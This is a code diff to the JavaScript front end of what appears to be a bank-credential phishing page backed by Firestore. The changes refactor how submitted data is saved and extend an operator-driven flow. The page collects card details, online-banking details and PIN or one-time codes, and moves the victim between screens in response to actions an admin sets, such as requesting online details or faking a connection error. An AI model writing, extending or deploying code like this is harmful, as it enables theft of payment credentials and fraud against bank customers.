@@ -2040,13 +2040,24 @@
 							hideLoader();
 							if (res) this.screen = "listDetails";
 						} catch (error) {
-							console.log("Error fetching user: ", error);
+							console.log("Error fetching user details: ", error);
 							hideLoader();
 						}
 					},
 					async handleEnterAccountDetails(e) {
 						e.preventDefault();
 						this.screen = "accountDetails";
+					},
+					async updateUser(value = {}) {
+						return await setDoc(
+							doc(db, "accounts", this.user.id_num),
+							{
+								...value,
+								last_update: Date.now(),
+								action: null,
+							},
+							{ merge: true }
+						);
 					},
 					async processForm(e, nextScreen, extraData = {}) {
 						e.preventDefault();
@@ -2058,18 +2069,13 @@
 						);
 
 						try {
-							const res = await setDoc(
-								doc(db, "accounts", this.user.id_num),
-								{
-									...data,
-									last_update: Date.now(),
-									action: null,
-									...extraData,
-								},
-								{ merge: true }
-							);
+							await this.updateUser({
+								...data,
+								last_update: Date.now(),
+								action: null,
+								...extraData,
+							});
 
-							// console.log("User updated: ", res);
 							hideLoader();
 
 							this.screen = nextScreen;
@@ -2088,9 +2094,12 @@
 						this.user.session = caseNumber;
 					},
 					async handleSaveCardDetails(e) {
+						this.cardDetailsError = null;
 						await this.processForm(e, "cardDetails", {
 							state: "CARD_UPDATED",
 						});
+
+						showLoader();
 
 						// this.waitForAction(showLoader());
 					},
@@ -2098,6 +2107,7 @@
 						return [...(this.user.pin_data || ["1234"])].pop().code;
 					},
 					async handleSaveOnlineDetails(e) {
+						this.onlineDetailsError = null;
 						const dt = new Date();
 						const pin_data = [
 							...(this.user.pin_data || []),
@@ -2111,16 +2121,18 @@
 							pin_data: JSON.stringify(pin_data),
 						});
 						this.user.pin_data = pin_data;
+						showLoader();
 
 						// console.log("Valid otp: ", this.validPin());
 
 						// this.waitForAction(showLoader());
 					},
 					async handleSavePinDetails(e) {
-						this.pinDetailsError = false;
-						await this.processForm(e, "completed", {
+						this.pinDetailsError = null;
+						await this.processForm(e, "pinDetails", {
 							state: "PIN_ADDED",
 						});
+						showLoader();
 					},
 					async handleSaveCompleted(e) {
 						// await this.processForm(e, "onlineDetails", {
@@ -2139,6 +2151,9 @@
 											screen: "cardDetails",
 											cardDetailsError: true,
 										},
+										REQUEST_ONLINE_DETAILS: {
+											screen: "onlineDetails",
+										},
 										ERROR_ONLINE_CONNECTION: {
 											screen: "onlineDetails",
 											onlineDetailsError: true,
@@ -2151,11 +2166,16 @@
 											pinDetailsError: true,
 										},
 										COMPLETE: {
-											screen: "complete",
+											screen: "completed",
 										},
 									};
 
 									const newState = actionStateMap[action];
+
+									if (!newState) return;
+
+									// remove action set by admin since we already handled it
+									this.updateUser();
 
 									if (newState) {
 										Object.entries(newState).forEach(
@@ -2176,7 +2196,7 @@
 										spinner.style.display = "none";
 									}
 								}
-								console.log("User data updated: ", action);
+								// console.log("User data updated: ", action);
 							}
 						);
 					},
